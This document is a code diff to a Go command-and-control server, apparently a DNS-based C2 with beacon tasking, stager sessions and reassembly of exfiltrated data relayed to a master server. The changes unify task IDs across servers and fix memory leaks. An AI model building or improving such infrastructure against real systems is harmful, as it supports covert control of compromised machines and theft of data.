@@ -135,30 +135,30 @@ type StagerSession struct {
 
 // C2Manager handles beacon management and tasking
 type C2Manager struct {
-	beacons               map[string]*Beacon
-	tasks                 map[string]*Task
-	masterTaskIDs         map[string]string               // key: local taskID, value: master taskID
-	resultChunks          map[string][]ResultChunk        // key: taskID (legacy)
-	expectedResults       map[string]*ExpectedResult      // key: taskID (new two-phase)
-	exfilSessions         map[string]*ExfilSession        // key: session hex string
-	exfilTagIndex         map[string]*ExfilTagTracker     // key: normalized session tag
-	stagerSessions        map[string]*StagerSession       // key: clientIP
-	cachedStagerSessions  map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
-	completedStagerLogs   map[string]bool                 // key: sessionID, value: true if completion logged (prevents spam)
-	recentMessages        map[string]time.Time            // key: message hash, value: timestamp (deduplication)
-	knownDomains          []string                        // Active DNS domains from Master (for first check-in)
-	db                    *Database                       // Database for persistent storage
-	resultBatchBuffer     map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
-	resultBatchTimer      map[string]*time.Timer          // key: taskID, value: batch flush timer
-	submittedData         map[string]bool                 // key: taskID, value: true if we submitted any data to Master
-	metadataAssemblers    map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
-	pendingLabelChunks    map[string][]pendingLabelChunk  // key: normalized session tag, value: buffered data frames awaiting metadata
-	tasksInProgress       map[string]time.Time            // key: taskID, value: first chunk received time (prevents re-delivery)
-	mutex                 sync.RWMutex
-	taskCounter           int // Counter for local tasks (standalone mode)
-	domainTaskCounter     int // Counter for domain update tasks (D prefix to avoid conflicts)
-	debug                 bool
-	aesKey                []byte
+	beacons              map[string]*Beacon
+	tasks                map[string]*Task
+	masterTaskIDs        map[string]string               // key: local taskID, value: master taskID
+	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
+	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
+	exfilSessions        map[string]*ExfilSession        // key: session hex string
+	exfilTagIndex        map[string]*ExfilTagTracker     // key: normalized session tag
+	stagerSessions       map[string]*StagerSession       // key: clientIP
+	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
+	completedStagerLogs  map[string]bool                 // key: sessionID, value: true if completion logged (prevents spam)
+	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
+	knownDomains         []string                        // Active DNS domains from Master (for first check-in)
+	db                   *Database                       // Database for persistent storage
+	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
+	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
+	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
+	metadataAssemblers   map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
+	pendingLabelChunks   map[string][]pendingLabelChunk  // key: normalized session tag, value: buffered data frames awaiting metadata
+	tasksInProgress      map[string]time.Time            // key: taskID, value: first chunk received time (prevents re-delivery)
+	mutex                sync.RWMutex
+	taskCounter          int // Counter for local tasks (standalone mode)
+	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
+	debug                bool
+	aesKey               []byte
 	jitterConfig         StagerJitter // Stager timing configuration
 	domain               string       // The domain this server is authoritative for
 }
@@ -283,10 +283,14 @@ func (c2 *C2Manager) loadTasksFromDB() error {
 			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.taskCounter {
 				c2.taskCounter = id + 1
 			}
+			// SHADOW MESH FIX: Populate masterTaskIDs for loaded master tasks
+			// Since we now use master task IDs directly, task.ID IS the master ID
+			c2.masterTaskIDs[task.ID] = task.ID
 		} else if strings.HasPrefix(task.ID, "D") {
 			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.domainTaskCounter {
 				c2.domainTaskCounter = id + 1
 			}
+			// Note: D-prefix tasks are domain updates (local only, not forwarded to Master)
 		}
 
 		// Add pending tasks to beacon queues
@@ -587,6 +591,8 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 		for tag, tracker := range c2.exfilTagIndex {
 			if now.Sub(tracker.LastActivity) > ExfilSessionTimeout {
 				delete(c2.exfilTagIndex, tag)
+				// Also clean up any pending chunks for this tag (memory leak fix)
+				delete(c2.pendingLabelChunks, normalizeExfilTag(tag))
 			}
 		}
 		c2.mutex.Unlock()
@@ -654,6 +660,23 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 			if now.Sub(startTime) > 30*time.Minute {
 				delete(c2.tasksInProgress, taskID)
 				inProgressCleanupCount++
+			}
+		}
+
+		// Clean up masterTaskIDs for completed/failed tasks (memory leak fix)
+		// Only clean up tasks that are completed/failed AND older than 1 hour
+		masterTaskCleanupCount := 0
+		for taskID := range c2.masterTaskIDs {
+			if task, exists := c2.tasks[taskID]; exists {
+				if (task.Status == "completed" || task.Status == "failed" || task.Status == "partial") &&
+					now.Sub(task.CreatedAt) > 1*time.Hour {
+					delete(c2.masterTaskIDs, taskID)
+					masterTaskCleanupCount++
+				}
+			} else {
+				// Task doesn't exist anymore, clean up the mapping
+				delete(c2.masterTaskIDs, taskID)
+				masterTaskCleanupCount++
 			}
 		}
 		c2.mutex.Unlock()
@@ -821,7 +844,7 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 			plaintext, decryptErr := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
 			if decryptErr == nil {
 				payloadB64 := base64.StdEncoding.EncodeToString(plaintext)
-				
+
 				// Try to forward to Master - if tag isn't registered yet, buffer for retry
 				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
 				if err == nil {
@@ -833,7 +856,7 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 					}
 					return true, nil
 				}
-				
+
 				// If Master rejected (tag not found), buffer the chunk for retry
 				// Don't create local sessions with tag_ prefix - this causes duplicate UI entries
 				if c2.debug {
@@ -1633,46 +1656,39 @@ func (c2 *C2Manager) AddDomainUpdateTask(beaconID, command string) string {
 }
 
 // AddTaskFromMaster adds a task received from the Master Server
+// SHADOW MESH FIX: Use Master's task ID directly instead of generating local IDs.
+// This ensures all DNS servers use the same task ID, so when a beacon sends results
+// to a different DNS server than the one that delivered the task, the task ID matches.
 func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) {
 	c2.mutex.Lock()
 	defer c2.mutex.Unlock()
 
 	// Check if we already have this task (deduplication)
-	for _, t := range c2.tasks {
-		if t.BeaconID == beaconID && t.Command == command && c2.masterTaskIDs[t.ID] == masterTaskID {
-			return
-		}
+	if _, exists := c2.tasks[masterTaskID]; exists {
+		return
 	}
 
 	// Check if this task is already in progress (delivered by this or another server)
-	for localID, masterID := range c2.masterTaskIDs {
-		if masterID == masterTaskID {
-			if _, inProgress := c2.tasksInProgress[localID]; inProgress {
-				// Task already delivered, don't re-add
-				return
-			}
-		}
+	if _, inProgress := c2.tasksInProgress[masterTaskID]; inProgress {
+		return
 	}
 
-	// Generate local task ID
-	c2.taskCounter++
-	localTaskID := fmt.Sprintf("T%04d", c2.taskCounter)
-
-	// Map local ID to master ID
-	c2.masterTaskIDs[localTaskID] = masterTaskID
+	// SHADOW MESH: Use Master's task ID directly - all DNS servers will have the same ID
+	// This replaces the old local task counter approach that caused ID mismatches
+	c2.masterTaskIDs[masterTaskID] = masterTaskID
 
 	task := &Task{
-		ID:        localTaskID,
+		ID:        masterTaskID,
 		BeaconID:  beaconID,
 		Command:   command,
 		Status:    "pending",
 		CreatedAt: time.Now(),
 	}
 
-	c2.tasks[localTaskID] = task
+	c2.tasks[masterTaskID] = task
 
 	if beacon, exists := c2.beacons[beaconID]; exists {
-		// Append a copy of the task value, but updates to c2.tasks[localTaskID]
+		// Append a copy of the task value, but updates to c2.tasks[masterTaskID]
 		// will be the authoritative source for status changes
 		beacon.TaskQueue = append(beacon.TaskQueue, *task)
 	}
@@ -1734,24 +1750,13 @@ func (c2 *C2Manager) SyncBeaconFromMaster(data BeaconData) {
 }
 
 // UpdateTaskStatusFromMaster updates a task status based on Master Server data
+// SHADOW MESH FIX: Task ID is now the master ID directly, no lookup needed
 func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 	c2.mutex.Lock()
 	defer c2.mutex.Unlock()
 
-	// Find local task ID
-	var localTaskID string
-	for lid, mid := range c2.masterTaskIDs {
-		if mid == masterTaskID {
-			localTaskID = lid
-			break
-		}
-	}
-
-	if localTaskID == "" {
-		return
-	}
-
-	task, exists := c2.tasks[localTaskID]
+	// SHADOW MESH: Task ID IS the master ID now - direct lookup
+	task, exists := c2.tasks[masterTaskID]
 	if !exists {
 		return
 	}
@@ -1768,7 +1773,7 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 				// Remove task from queue
 				newQueue := make([]Task, 0, len(beacon.TaskQueue))
 				for _, t := range beacon.TaskQueue {
-					if t.ID != localTaskID {
+					if t.ID != masterTaskID {
 						newQueue = append(newQueue, t)
 					}
 				}
@@ -1776,17 +1781,17 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 					beacon.TaskQueue = newQueue
 					if c2.debug {
 						logf("[C2] Removed task %s from beacon %s queue (status: %s, delivered by another server)",
-							localTaskID, task.BeaconID, status)
+							masterTaskID, task.BeaconID, status)
 					}
 				}
 			}
 			// Also mark in tasksInProgress to prevent re-delivery if queued again
-			c2.tasksInProgress[localTaskID] = time.Now()
+			c2.tasksInProgress[masterTaskID] = time.Now()
 		}
 
 		// If completed/failed, clear from beacon's current task
 		if status == "completed" || status == "failed" {
-			if beacon, ok := c2.beacons[task.BeaconID]; ok && beacon.CurrentTask == localTaskID {
+			if beacon, ok := c2.beacons[task.BeaconID]; ok && beacon.CurrentTask == masterTaskID {
 				beacon.CurrentTask = ""
 			}
 		}
@@ -1797,7 +1802,7 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 				if err := c2.db.UpdateTaskStatus(tid, s); err != nil && c2.debug {
 					logf("[DB] Failed to update task status: %v", err)
 				}
-			}(localTaskID, status)
+			}(masterTaskID, status)
 		}
 	}
 }
